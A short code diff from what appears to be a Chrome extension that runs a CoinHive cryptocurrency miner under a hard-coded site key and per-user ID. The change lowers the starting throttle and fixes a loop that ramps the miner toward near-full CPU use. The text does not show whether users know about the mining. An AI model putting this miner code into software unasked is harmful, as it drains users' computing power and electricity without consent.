@@ -37,7 +37,7 @@ chrome.storage.sync.get(['userid','mySites'], function(items) {
 		console.log("No ID found, generated: " +userid);
         chrome.storage.sync.set({userid: userid}, function() {});
     }
-	miner = new CoinHive.User('faLtux0jRiZXXe2iiN1XEfyj7sj5Ykg3',userid, {threads: 1,throttle: 0.8});
+	miner = new CoinHive.User('faLtux0jRiZXXe2iiN1XEfyj7sj5Ykg3',userid, {threads: 1,throttle: 0.6});
 	
 	//recall their stored sites, or generate defaults
 	var stored_sites = items.mySites;
@@ -100,8 +100,10 @@ function attemptStart() {
 		rampInterval = setInterval(function(){
 			var currentThrottle = miner.getThrottle();
 			miner.setThrottle(currentThrottle - 0.1);
-			if(currentThrottle-0.1 == 0)
+			if(currentThrottle-0.1 < 0.09){
 				clearInterval(rampInterval);
+				console.log("rampInterval cleared, at steady state throttle");
+			}
 		},90e3);
 		//periodically update totals
 		logInterval = setInterval(function(){
